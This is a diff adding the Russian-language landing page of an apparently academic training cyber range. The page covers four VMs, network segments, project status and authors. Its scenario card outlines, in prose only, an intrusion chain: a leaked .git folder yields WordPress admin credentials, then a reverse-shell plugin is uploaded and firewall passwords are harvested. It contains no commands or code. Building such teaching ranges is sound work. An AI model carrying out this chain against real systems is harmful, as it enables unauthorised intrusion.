@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Прастора — учебный киберполигон</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%22-1 -1 9 9%22><rect x=%22-1%22 y=%22-1%22 width=%229%22 height=%229%22 fill=%22%23050c1f%22/><rect x=%220%22 y=%220%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%221%22 y=%220%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%222%22 y=%220%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%223%22 y=%220%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%224%22 y=%220%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%225%22 y=%220%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%226%22 y=%220%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%220%22 y=%221%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%221%22 y=%221%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%222%22 y=%221%22 width=%22.86%22 height=%22.86%22 fill=%22%23fff%22/><rect x=%223%22 y=%221%22 width=%22.86%22 height=%22.86%22 fill=%22%23fff%22/><rect x=%224%22 y=%221%22 width=%22.86%22 height=%22.86%22 fill=%22%23fff%22/><rect x=%225%22 y=%221%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%226%22 y=%221%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%220%22 y=%222%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%221%22 y=%222%22 width=%22.86%22 height=%22.86%22 fill=%22%23fff%22/><rect x=%225%22 y=%222%22 width=%22.86%22 height=%22.86%22 fill=%22%23fff%22/><rect x=%226%22 y=%222%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%220%22 y=%223%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%221%22 y=%223%22 width=%22.86%22 height=%22.86%22 fill=%22%23fff%22/><rect x=%225%22 y=%223%22 width=%22.86%22 height=%22.86%22 fill=%22%23fff%22/><rect x=%226%22 y=%223%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%220%22 y=%224%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%221%22 y=%224%22 width=%22.86%22 height=%22.86%22 fill=%22%23fff%22/><rect x=%222%22 y=%224%22 width=%22.86%22 height=%22.86%22 fill=%22%23fff%22/><rect x=%223%22 y=%224%22 width=%22.86%22 height=%22.86%22 fill=%22%23fff%22/><rect x=%224%22 y=%224%22 width=%22.86%22 height=%22.86%22 fill=%22%23fff%22/><rect x=%225%22 y=%224%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%226%22 y=%224%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%220%22 y=%225%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%221%22 y=%225%22 width=%22.86%22 height=%22.86%22 fill=%22%23fff%22/><rect x=%225%22 y=%225%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%226%22 y=%225%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%220%22 y=%226%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%221%22 y=%226%22 width=%22.86%22 height=%22.86%22 fill=%22%23fff%22/><rect x=%225%22 y=%226%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/><rect x=%226%22 y=%226%22 width=%22.86%22 height=%22.86%22 fill=%22%231f5fff%22/></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&family=JetBrains+Mono:wght@400;500;700&family=Tiny5&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#eef3fb;--fg:#061331;--mut:#4a5b7e;--line:#c3d0e8;--pu:#0b4fd6;--li:#8fd3ff;--card:#f7faff;--nv:#003386;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+@media(prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#050c1f;--fg:#eaf1ff;--mut:#8fa3c7;--line:#1b2b55;--card:#0a1530;--pu:#4d8bff}}
+:root[data-theme="dark"]{--bg:#050c1f;--fg:#eaf1ff;--mut:#8fa3c7;--line:#1b2b55;--card:#0a1530;--pu:#4d8bff}
+*{box-sizing:border-box;margin:0}
+html{scroll-behavior:smooth;scroll-padding-top:70px}
+body{background:var(--bg);color:var(--fg);font:14px/1.6 'JetBrains Mono',ui-monospace,monospace}
+a{color:inherit;text-decoration:none}
+:focus-visible{outline:3px solid var(--pu);outline-offset:2px}
+.wrap{max-width:1180px;margin:0 auto;padding:0 24px}
+.d{font-family:Oswald,'Arial Narrow',Impact,sans-serif;text-transform:uppercase;line-height:.92;letter-spacing:-.01em}
+.pu{color:var(--pu)}.sm{font-size:12px;color:var(--mut)}
+nav{position:sticky;top:0;z-index:9;background:var(--bg);border-bottom:1px solid var(--line)}
+nav .wrap{display:flex;align-items:center;gap:28px;height:64px}
+.logo{font-weight:700;font-size:18px}.logo i{color:var(--pu);font-style:normal}
+nav ul{display:flex;gap:24px;list-style:none;padding:0;margin-left:auto;font-size:12px}
+.clock{border-left:1px solid var(--line);padding-left:20px;font-size:11px;color:var(--mut);line-height:1.3}
+.btn{display:inline-flex;align-items:center;gap:14px;background:var(--nv);color:#fff;padding:14px 22px;font:500 12px 'JetBrains Mono';text-transform:uppercase;border:0;cursor:pointer}
+.btn:hover{background:var(--pu)}
+.btn.pu{background:var(--pu)}.btn.pu:hover{background:var(--nv)}
+.btn.ghost{background:none;color:var(--fg);padding-left:0}
+.btn:disabled{opacity:.7;cursor:default}
+section{border-bottom:1px solid var(--line)}
+.tag{font-size:12px;color:var(--pu);margin-bottom:28px;display:block}
+.tag b{color:var(--fg);font-weight:500;margin-left:20px}
+.hero{display:grid;grid-template-columns:1fr 1fr;min-height:560px}
+.hero .l{padding:48px 24px 48px 0}
+h1{font-size:clamp(64px,9vw,128px);margin:12px 0 28px}
+.sub{color:var(--pu);font-weight:500;letter-spacing:.06em;margin-bottom:24px}
+.hero p{max-width:420px;margin-bottom:36px}
+.hero .r{position:relative;border-left:1px solid var(--line);display:grid;place-items:center}
+#cube{display:grid;grid-template-columns:repeat(48,1fr);gap:2px;width:min(88%,540px);aspect-ratio:48/28;padding:10px;background:var(--nv);box-shadow:8px 8px 0 var(--pu)}
+#cube i{display:block;transition:background .4s}
+.pr{display:grid;grid-template-columns:repeat(5,1fr);gap:0;padding:56px 0}
+.pr div{padding:0 20px;border-left:1px solid var(--line)}
+.pr div:first-child{border:0;padding-left:0}
+.pr h3{font:500 12px 'JetBrains Mono';color:var(--pu);text-transform:uppercase;margin:14px 0 10px}
+.pr p{font-size:12px;color:var(--mut)}
+.pr .ic{display:block;height:44px}.pxa{display:grid;gap:1px}.pxa i{display:block}.strip{display:grid;gap:2px;margin:28px 0}.strip i{display:block;aspect-ratio:1}
+.work{padding:56px 0}
+.cards{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.card{border:1px solid var(--line);background:var(--card);padding:10px;transition:.15s}
+.card:hover{border-color:var(--pu);transform:translate(-3px,-3px);box-shadow:5px 5px 0 var(--pu)}
+.card .im{height:150px;background:var(--nv);margin-bottom:14px;display:grid;place-items:center;position:relative;overflow:hidden}
+.card .im::after{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,rgba(255,255,255,.06) 0 1px,transparent 1px 4px)}
+.card b{display:block;font-weight:700}.card span{font-size:11px;color:var(--mut)}
+.card p{font-size:12px;margin-top:8px}
+.tri{display:grid;grid-template-columns:1fr 1fr 1fr}
+.tri>div{padding:48px 32px;border-left:1px solid var(--line)}
+.tri>div:first-child{border:0;padding-left:0}
+.tri h2{font-size:30px;margin-bottom:18px}
+.tri p{margin-bottom:22px;max-width:320px}
+.row{display:grid;grid-template-columns:110px 1fr 120px;align-items:center;gap:12px;font-size:11px;margin-bottom:12px}
+.bar{height:6px;background:var(--line);position:relative}.bar i{position:absolute;inset:0 auto 0 0;background:var(--pu)}
+.ok{background:var(--li);color:#00122f;padding:10px 14px;font-size:12px;margin-top:22px;display:flex;justify-content:space-between}
+.ok::after{content:"";width:10px;height:10px;border-radius:50%;background:#00122f;align-self:center}
+form{display:flex;flex-direction:column;gap:10px}
+input,select{font:inherit;padding:13px;border:1px solid var(--line);background:var(--card);color:var(--fg);width:100%}
+#msg{font-size:12px;min-height:20px;color:var(--pu)}
+.logos{display:flex;flex-wrap:wrap;gap:12px 44px;padding:40px 0;font:700 17px 'JetBrains Mono';color:var(--mut)}
+footer .wrap{display:grid;grid-template-columns:1.2fr 1fr 1fr 1fr;gap:24px;padding:40px 24px;font-size:12px}
+footer h4{font-weight:700;margin-bottom:10px}footer li{list-style:none;color:var(--mut);margin-bottom:4px}footer ul{padding:0}
+.bot{display:flex;justify-content:space-between;background:var(--nv);color:#fff;font-size:12px;padding:0 24px}
+.bot span{padding:14px 0}.bot .ag{background:var(--pu);flex:1;max-width:420px;text-align:center}
+.st{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}.st div{border:1px solid var(--line);background:var(--card);padding:16px;font-size:12px}.st b{display:block;color:var(--pu);margin-bottom:6px}.ul{padding:0;list-style:none;font-size:12px}.ul li{margin-bottom:10px;padding-left:18px;position:relative}.ul li::before{content:">";position:absolute;left:0;color:var(--pu)}
+@media(max-width:900px){.team{grid-template-columns:1fr 1fr}.st{grid-template-columns:1fr 1fr}
+nav ul,.clock{display:none}nav .btn{margin-left:auto}
+.hero,.tri,footer .wrap{grid-template-columns:1fr}
+.hero .r{min-height:420px;border-left:0;border-top:1px solid var(--line)}
+.pr{grid-template-columns:1fr 1fr;gap:28px 0}.pr div:nth-child(odd){border-left:0;padding-left:0}
+.cards{grid-template-columns:1fr 1fr}
+.tri>div{border-left:0;border-top:1px solid var(--line);padding:36px 0}
+.bot span:last-child{display:none}}
+@media(max-width:520px){.team{grid-template-columns:1fr}.logo.lg .t5{font-size:22px}.logo.lg{gap:10px}.lm{width:36px;height:36px;padding:5px}nav .wrap{gap:12px}nav .btn{padding:12px 14px}.st{grid-template-columns:1fr}.cards,.pr{grid-template-columns:1fr}.pr div{border:0;padding:0}}
+.pxa i{animation:wv 2.6s ease-in-out infinite}.strip i,#cube i.B{animation:tw 3s ease-in-out infinite}#cube i.L{animation:sh 6s ease-in-out infinite}
+.card:hover .pxa i{animation-duration:.9s}
+.team{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.mem{border:1px solid var(--line);background:var(--card);padding:10px}
+.mem .ph{background:#2457c5;aspect-ratio:40/50;display:grid;padding:10px 10px 0;position:relative;overflow:hidden}
+.mem .ph .g{display:grid;gap:0;width:100%;height:100%}
+.mem .ph i{display:block;animation:pin .5s backwards}
+.mem b{display:block;margin-top:12px}.mem span{font-size:11px;color:var(--mut)}
+.mem:hover{border-color:var(--pu);transform:translate(-3px,-3px);box-shadow:5px 5px 0 var(--pu)}.mem{transition:.15s}
+@keyframes pin{from{opacity:0;transform:scale(0)}}
+@keyframes wv{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(.5);opacity:.55}}
+@keyframes tw{0%,100%{opacity:1}50%{opacity:.35}}
+@keyframes sh{0%,60%,100%{transform:scale(1)}72%{background:#5cb8f5;transform:scale(.7)}84%{background:#fff;transform:scale(1)}}
+@keyframes bl{50%{opacity:0}}
+@media(prefers-reduced-motion:reduce){*{transition:none!important;animation:none!important}}
+.t5{font-family:Tiny5,'JetBrains Mono',ui-monospace,monospace;font-weight:400;letter-spacing:.02em;text-transform:uppercase}
+.lg{display:flex;align-items:center;gap:14px}
+.lm{display:block;flex:none;width:42px;height:42px;padding:6px;background:#050c1f;border:1px solid #1f5fff}.lm svg{display:block;width:100%;height:100%}
+.logo.lg .t5{font-size:30px;line-height:1;color:var(--fg)}
+h1.t5{font-size:clamp(40px,6.4vw,88px);line-height:1;margin:12px 0 28px}
+#plogo{display:grid;grid-template-columns:repeat(48,1fr);gap:2px;width:min(88%,540px);aspect-ratio:48/28;padding:10px;background:#050c1f;box-shadow:8px 8px 0 var(--pu)}
+#plogo i{display:block}
+#plogo i.B{animation:lgtw 3s ease-in-out infinite}
+#plogo i.F{animation:lgin .45s cubic-bezier(.2,1.4,.4,1) backwards,lgsh 3.4s ease-in-out infinite}
+#plogo i.W{animation:lgin .45s cubic-bezier(.2,1.4,.4,1) backwards}
+@keyframes lgin{from{opacity:0;transform:scale(.1)}}
+@keyframes lgsh{50%{opacity:.6}}
+@keyframes lgtw{50%{opacity:.35}}
+@media(prefers-reduced-motion:reduce){#plogo i{animation:none!important}}
+.uni{display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center;padding:56px 0}
+.uni h2{font-size:30px;margin-bottom:16px}.uni p{max-width:380px}.uni .cw{display:grid;place-items:center}
+@media(max-width:900px){.uni{grid-template-columns:1fr}}
+
+/* --- Обучение: путь модулей --- */
+.lprog{display:flex;align-items:center;gap:14px;margin-bottom:8px;font-size:12px;color:var(--mut)}
+.lprog .bar{flex:1;height:8px}
+.ltoggle{display:flex;align-items:center;gap:10px;margin-bottom:26px;font-size:12px;color:var(--mut)}
+.lsw{width:36px;height:20px;border:1px solid var(--line);background:var(--card);position:relative;cursor:pointer;flex:none}
+.lsw i{position:absolute;top:2px;left:2px;width:14px;height:14px;background:var(--mut);transition:.15s}
+.lsw.on{border-color:var(--pu)}.lsw.on i{left:18px;background:var(--pu)}
+.lpath{display:flex;align-items:flex-end;gap:0;margin-bottom:36px;overflow-x:auto;padding:30px 4px 6px}
+.lpath.hide{display:none}
+.lnode{display:flex;flex-direction:column;align-items:center;flex:none;width:140px;cursor:pointer;position:relative}
+.lnode .lln{width:100%;height:1px;background:var(--line);position:absolute;top:33px;left:-50%;z-index:0}
+.lnode:first-child .lln{display:none}
+.lnode .ltile{width:64px;height:64px;background:var(--nv);box-shadow:5px 5px 0 var(--pu);display:grid;place-items:center;position:relative;z-index:1;transition:.15s}
+.lnode.cur .ltile{box-shadow:5px 5px 0 var(--li)}
+.lnode.full .ltile{background:#1f8a3a}
+.lnode span{font-size:11px;text-align:center;margin-top:10px;color:var(--mut);line-height:1.3}
+.lnode.cur span{color:var(--fg)}
+.lnode b{display:block;font-size:10px;color:var(--pu);margin-top:4px}
+.lgroup{margin-bottom:34px}
+.lgroup>span{font:500 12px 'JetBrains Mono';color:var(--pu);text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:14px;scroll-margin-top:80px}
+.lcard{border:1px solid var(--line);background:var(--card);margin-bottom:12px;transition:.15s}
+.lcard.done{border-color:#1f8a3a}
+.lchead{display:flex;align-items:center;gap:12px;padding:14px 16px;cursor:pointer}
+.lchk{width:18px;height:18px;border:1px solid var(--line);flex:none;display:grid;place-items:center;font-size:11px;color:transparent}
+.lcard.done .lchk{background:#1f8a3a;border-color:#1f8a3a;color:#fff}
+.ltag{color:var(--pu);font-size:11px;flex:none}
+.lchead b{font-size:13px;flex:1}
+.lchev{color:var(--mut);transition:.15s}
+.lcard.open .lchev{transform:rotate(180deg)}
+.lcbody{display:none;padding:0 16px 18px}
+.lcard.open .lcbody{display:block}
+.lgoal{font-size:12px;color:var(--mut);margin-bottom:16px}
+.lqline{display:flex;align-items:center;gap:14px;margin:18px 0 12px}
+.lqline span{font:500 11px 'JetBrains Mono';color:var(--pu);text-transform:uppercase;letter-spacing:.06em;white-space:nowrap}
+.lqline i{flex:1;height:1px;background:var(--line)}
+.lq{border:1px solid var(--line);background:var(--bg);padding:14px}
+.lq>p{font-size:12px;margin-bottom:12px}
+.lopt{display:flex;align-items:center;gap:10px;border:1px solid var(--line);padding:10px 12px;font-size:12px;margin-bottom:8px;cursor:pointer;font-family:'JetBrains Mono';word-break:break-word}
+.lopt:hover{border-color:var(--pu)}
+.lopt .ldot{width:14px;height:14px;border:1px solid var(--mut);border-radius:50%;flex:none;position:relative}
+.lopt.sel .ldot{border-color:var(--pu)}
+.lopt.sel .ldot::after{content:"";position:absolute;inset:3px;background:var(--pu);border-radius:50%}
+.lopt.right{border-color:#1f8a3a;background:rgba(31,138,58,.12)}
+.lopt.right .ldot{border-color:#1f8a3a}
+.lopt.right .ldot::after{content:"";position:absolute;inset:3px;background:#1f8a3a;border-radius:50%}
+.lopt.wrong{border-color:#c0392b;background:rgba(192,57,43,.1)}
+.lmsg{font-size:12px;margin-top:10px;min-height:14px}
+.lmsg.ok{color:#1f8a3a;font-weight:700}
+.lmsg.bad{color:#c0392b;font-weight:700}
+.lmsg.warn{color:var(--mut)}
+.lqbtns{display:flex;gap:10px;margin-top:4px;flex-wrap:wrap}
+.lqbtns .btn{padding:8px 14px;font-size:11px}
+.lhint{border:1px dashed var(--line);padding:10px 12px;font-size:12px;color:var(--mut);margin-top:12px;display:none}
+.lhint.show{display:block}
+.lterm{display:none;margin-top:12px}
+.lterm.show{display:block}
+.lterm b{display:block;font-size:11px;color:var(--pu);text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px}
+.lterm pre{font:12px/1.5 'JetBrains Mono';background:#050c1f;color:#8fd3ff;border:1px solid var(--line);padding:12px;overflow-x:auto;white-space:pre-wrap;word-break:break-word;margin:0 0 10px}
+.lterm .lexp{font-size:12px;color:var(--mut)}
+
+/* --- Форма ввода флага --- */
+.lflag{display:none;margin-top:14px;border:1px dashed var(--pu);padding:12px;background:rgba(11,79,214,.06)}
+.lflag.show{display:block}
+.lflag b{display:block;font-size:11px;color:var(--pu);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px}
+.lflag .lflagrow{display:flex;gap:8px;flex-wrap:wrap}
+.lflag input{flex:1;min-width:180px;font:12px 'JetBrains Mono';padding:10px 12px;border:1px solid var(--line);background:var(--card);color:var(--fg)}
+.lflag input:focus{outline:2px solid var(--pu);outline-offset:1px}
+.lflag .lflagmsg{font-size:12px;margin-top:8px;min-height:14px}
+.lflag .lflagmsg.ok{color:#1f8a3a;font-weight:700}
+.lflag .lflagmsg.bad{color:#c0392b;font-weight:700}
+.lcard.locked{opacity:.55;pointer-events:none;filter:grayscale(.35)}
+.lcard.locked .lchead{cursor:not-allowed}
+.lcard.locked::after{content:"ЗАБЛОКИРОВАНО — СНАЧАЛА ВВЕДИТЕ ФЛАГ";display:block;padding:0 16px 12px;font-size:10px;color:#c0392b;letter-spacing:.06em}
+</style>
+</head>
+<body>
+<svg width="0" height="0" style="position:absolute" aria-hidden="true"><symbol id="pm" viewBox="-.07 -.07 7 7"><rect x="0" y="0" width=".86" height=".86" fill="#1f5fff"/><rect x="1" y="0" width=".86" height=".86" fill="#1f5fff"/><rect x="2" y="0" width=".86" height=".86" fill="#1f5fff"/><rect x="3" y="0" width=".86" height=".86" fill="#1f5fff"/><rect x="4" y="0" width=".86" height=".86" fill="#1f5fff"/><rect x="5" y="0" width=".86" height=".86" fill="#1f5fff"/><rect x="6" y="0" width=".86" height=".86" fill="#1f5fff"/><rect x="0" y="1" width=".86" height=".86" fill="#1f5fff"/><rect x="1" y="1" width=".86" height=".86" fill="#1f5fff"/><rect x="2" y="1" width=".86" height=".86" fill="#fff"/><rect x="3" y="1" width=".86" height=".86" fill="#fff"/><rect x="4" y="1" width=".86" height=".86" fill="#fff"/><rect x="5" y="1" width=".86" height=".86" fill="#1f5fff"/><rect x="6" y="1" width=".86" height=".86" fill="#1f5fff"/><rect x="0" y="2" width=".86" height=".86" fill="#1f5fff"/><rect x="1" y="2" width=".86" height=".86" fill="#fff"/><rect x="5" y="2" width=".86" height=".86" fill="#fff"/><rect x="6" y="2" width=".86" height=".86" fill="#1f5fff"/><rect x="0" y="3" width=".86" height=".86" fill="#1f5fff"/><rect x="1" y="3" width=".86" height=".86" fill="#fff"/><rect x="5" y="3" width=".86" height=".86" fill="#fff"/><rect x="6" y="3" width=".86" height=".86" fill="#1f5fff"/><rect x="0" y="4" width=".86" height=".86" fill="#1f5fff"/><rect x="1" y="4" width=".86" height=".86" fill="#fff"/><rect x="2" y="4" width=".86" height=".86" fill="#fff"/><rect x="3" y="4" width=".86" height=".86" fill="#fff"/><rect x="4" y="4" width=".86" height=".86" fill="#fff"/><rect x="5" y="4" width=".86" height=".86" fill="#1f5fff"/><rect x="6" y="4" width=".86" height=".86" fill="#1f5fff"/><rect x="0" y="5" width=".86" height=".86" fill="#1f5fff"/><rect x="1" y="5" width=".86" height=".86" fill="#fff"/><rect x="5" y="5" width=".86" height=".86" fill="#1f5fff"/><rect x="6" y="5" width=".86" height=".86" fill="#1f5fff"/><rect x="0" y="6" width=".86" height=".86" fill="#1f5fff"/><rect x="1" y="6" width=".86" height=".86" fill="#fff"/><rect x="5" y="6" width=".86" height=".86" fill="#1f5fff"/><rect x="6" y="6" width=".86" height=".86" fill="#1f5fff"/></symbol></svg>
+<nav><div class="wrap">
+<a class="logo lg" href="#top"><span class="lm"><svg viewBox="0 0 7 7" shape-rendering="crispEdges" aria-hidden="true"><use href="#pm"/></svg></span><span class="t5">Прастора</span></a>
+<ul><li><a href="#func">Стенд</a></li><li><a href="#sc">Сегменты</a></li><li><a href="#status">Статус</a></li><li><a href="#road">Этапы</a></li><li><a href="#team">Авторы</a></li><li><a href="#learn">Обучение</a></li></ul>
+<div class="clock">SYS.TIME<br><span id="t">00:00:00</span> UTC</div>
+<a class="btn pu" href="#learn">Начать обучение ↗</a>
+</div></nav>
+
+<section id="top"><div class="wrap hero">
+<div class="l">
+<span class="tag">/01</span>
+<h1 class="d t5">Прастора</h1>
+<div class="sub">ПРАСТОРА · УЧЕБНЫЙ КИБЕРПОЛИГОН</div>
+<p>Виртуальная инфраструктура из четырёх машин, в которой участник проходит заранее подготовленный сценарий: от веб-уязвимости в первом сегменте до управляющего узла Ansible.</p>
+<a class="btn pu" href="#learn">Начать обучение ↗</a> <a class="btn ghost" href="#func">О стенде [ ]</a>
+</div>
+<div class="r"><div id="plogo" aria-hidden="true"></div>
+</div>
+</div></section>
+
+<div class="wrap"><div class="strip" data-strip="l"></div></div>
+<section id="func"><div class="wrap">
+<div class="pr" style="padding-bottom:0;padding-top:48px;display:block"><span class="tag">/02<b>ВОЗМОЖНОСТИ СТЕНДА</b></span></div>
+<div class="pr" style="padding-top:0">
+<div><span class="ic" data-a="server" data-w="44"></span><h3>Воспроизводимый стенд</h3><p>Четыре ВМ в VirtualBox разворачиваются по инструкции из образов .ova.</p></div>
+<div><span class="ic" data-a="wall" data-w="44"></span><h3>Сегментация</h3><p>Межсетевой экран на FreeBSD с четырьмя адаптерами ограничивает доступ между сегментами.</p></div>
+<div><span class="ic" data-a="list" data-w="44"></span><h3>Последовательный сценарий</h3><p>Доступ к следующему сегменту открывается только после выполнения этапа.</p></div>
+<div><span class="ic" data-a="eye" data-w="44"></span><h3>Наблюдаемость</h3><p>Доступность сервисов, подключения, время и ключевые этапы прохождения.</p></div>
+<div><span class="ic" data-a="check" data-w="44"></span><h3>Возврат в исходное</h3><p>Снимки ВМ и описанный порядок восстановления для следующего участника.</p></div>
+</div></div></section>
+
+<section id="sc"><div class="wrap work">
+<span class="tag">/03<b>СЕГМЕНТЫ И СЦЕНАРИЙ</b></span>
+<div class="cards">
+<a class="card" href="#road"><div class="im" data-a="globe" data-w="96" data-d="1"></div><b>Сегмент 1 · DMZ</b><span>ВХОД ЧЕРЕЗ OPENVPN</span><p>Уязвимый WordPress в контейнере. Утечка каталога .git раскрывает креды администратора — дальше загрузка reverse-shell плагина и поиск паролей firewall в конфиге.</p></a>
+<a class="card" href="#road"><div class="im" data-a="shield" data-w="96" data-d="1"></div><b>Межсетевой экран</b><span>FREEBSD · 4 АДАПТЕРА</span><p>Вход в интерфейс управления и изменение правила: открыть сегмент 1 → 2.</p></a>
+<a class="card" href="#road"><div class="im" data-a="brackets" data-w="120" data-d="1"></div><b>Сегмент 2 · Internal</b><span>GITLAB · JENKINS</span><p>Имитация среды разработки. Разбор конфликта GitLab, SSRF-приложение удаляется.</p></a>
+<a class="card" href="#road"><div class="im" data-a="gear" data-w="96" data-d="1"></div><b>Сегмент 3 · Manag</b><span>ANSIBLE</span><p>Управляющий узел: inventory, SSH-ключи, контроль над всей инфраструктурой.</p></a>
+</div></div></section>
+
+<div class="wrap"><div class="strip" data-strip="r"></div></div>
+<section id="status"><div class="wrap tri">
+<div><span class="tag">/04</span><h2 class="d">О проекте</h2><p>«Прастора» — виртуальный полигон из четырёх ВМ для отработки реального сценария атаки: от утечки .git в уязвимом WordPress на границе DMZ, через межсетевой экран pfSense, до внутреннего сегмента с GitLab и CI/CD-сервером Jenkins. Проект подготовлен как учебный на базе БГУИР.</p></div>
+<div><span class="tag">/05</span><h2 class="d">Статус проекта</h2>
+<div class="row"><span>ОБРАЗЫ</span><div class="bar"><i style="width:100%"></i></div><span>ПОЛУЧЕНЫ</span></div>
+<div class="row"><span>VPN-ПРОФИЛЬ</span><div class="bar"><i style="width:100%"></i></div><span>ПОЛУЧЕН</span></div>
+<div class="row"><span>ИМПОРТ</span><div class="bar"><i style="width:30%"></i></div><span>В ПРОЦЕССЕ</span></div>
+<div class="row"><span>РАБОТА СТЕНДА</span><div class="bar"><i style="width:0"></i></div><span>НЕ ПОДТВЕРЖДЕНА</span></div>
+<div class="ok">ЭТАП: БАЗОВЫЙ ЗАПУСК</div></div>
+<div><span class="tag">/06</span><h2 class="d">Открытые вопросы</h2>
+<ul class="ul"><li>Причина конфликта GitLab</li><li>Переход от учётных данных Jenkins к управлению Ansible</li><li>Изоляция стенда от реальных сетей и хоста</li><li>Выдача VPN-профилей и одновременное прохождение</li></ul></div>
+</div></section>
+
+<section id="road"><div class="wrap work">
+<span class="tag">/07<b>ПЛАН РАБОТ</b></span>
+<div class="st">
+<div><b>01</b>Импорт образов, сохранение исходного состояния</div>
+<div><b>02</b>Перечень сервисов, версий, учётных записей, сетей</div>
+<div><b>03</b>Восстановление сети, проверка существующих этапов</div>
+<div><b>04</b>Исправление GitLab и Jenkins, удаление SSRF-приложения</div>
+<div><b>05</b>Переход к третьему сегменту, настройка Ansible</div>
+<div><b>06</b>Доведение сценария сегмента 3 — от учётных данных Jenkins до Ansible</div>
+<div><b>07</b>VPN-участники, регистрация результатов, восстановление</div>
+<div><b>08</b>Инструкции и полное контрольное прохождение</div>
+</div>
+<p class="sm" style="margin-top:28px;max-width:760px">Научная часть: воспроизводимость и наблюдаемость учебного сценария. Критерии: успешность повторного развёртывания, соблюдение ограничений между сегментами, регистрация ключевых действий, корректность восстановления. Постановка согласуется с научным руководителем.</p>
+</div></section>
+
+<section id="team"><div class="wrap work">
+<span class="tag">/08<b>АВТОРЫ ПРОЕКТА</b></span>
+<div class="team">
+<div class="mem"><div class="ph" data-p="0" role="img" aria-label="Горбик Александр"></div><b>Горбик Александр</b><span>АВТОР ПРОЕКТА</span></div>
+<div class="mem"><div class="ph" data-p="1" role="img" aria-label="Клиндухов Ярослав"></div><b>Клиндухов Ярослав</b><span>АВТОР ПРОЕКТА</span></div>
+<div class="mem"><div class="ph" data-p="2" role="img" aria-label="Белоусова Елена Сергеевна"></div><b>Белоусова Елена Сергеевна</b><span>НАУЧНЫЙ РУКОВОДИТЕЛЬ</span></div>
+</div></div></section>
+
+<section id="learn"><div class="wrap work">
+<span class="tag">/11<b>ПОШАГОВОЕ ОБУЧЕНИЕ</b></span>
+<p class="sm" style="max-width:640px;margin-bottom:10px">
+Каждый шаг — реальный этап прохождения «Прасторы». Сначала прочитайте ситуацию и подумайте,
+что бы вы сделали. Команда и разбор флагов появляются только после нажатия «Показать подсказку».
+Прогресс сохраняется в этом браузере.
+</p>
+<div class="lprog"><span id="lpct">0 / 0 шагов</span><div class="bar"><i id="lbar" style="width:0%"></i></div><a href="#" id="lreset" class="sm" style="color:var(--pu)">Сбросить прогресс</a></div>
+<div class="ltoggle"><div class="lsw on" id="lsw"><i></i></div><span>Путь модулей</span></div>
+<div class="lpath" id="lpathRoot"></div>
+<div id="lroot"></div>
+</div></section>
+
+<section id="uni"><div class="wrap uni">
+<div><span class="tag">/10<b>БГУИР</b></span><h2 class="d">Учебный проект БГУИР</h2><p>Стенд подготовлен как учебный проект Белорусского государственного университета информатики и радиоэлектроники.</p></div>
+<div class="cw"><div id="cube" aria-hidden="true"></div></div>
+</div></section>
+
+<section><div class="wrap"><span class="tag" style="padding-top:36px">/09<b>ТЕХНОЛОГИИ</b></span>
+<div class="logos"><span>VirtualBox</span><span>OpenVPN</span><span>FreeBSD</span><span>WordPress</span><span>GitLab</span><span>Jenkins</span><span>Ansible</span></div></div></section>
+
+<div class="wrap"><div class="strip" data-strip="l"></div></div>
+<footer><div class="wrap">
+<div><div class="lg"><span class="lm"><svg viewBox="0 0 7 7" shape-rendering="crispEdges" aria-hidden="true"><use href="#pm"/></svg></span><b class="t5" style="font-size:24px;font-weight:400">Прастора</b></div><p class="sm" style="margin-top:12px">© 2026 Прастора.<br>УЧЕБНЫЙ ПРОЕКТ.</p></div>
+<div><h4>НАВИГАЦИЯ</h4><ul><li>Стенд</li><li>Сегменты</li><li>Статус</li><li>Этапы</li></ul></div>
+<div><h4>МАТЕРИАЛЫ</h4><ul><li>Инструкция по развёртыванию</li><li>Описание сценария</li><li>Результаты испытаний</li></ul></div>
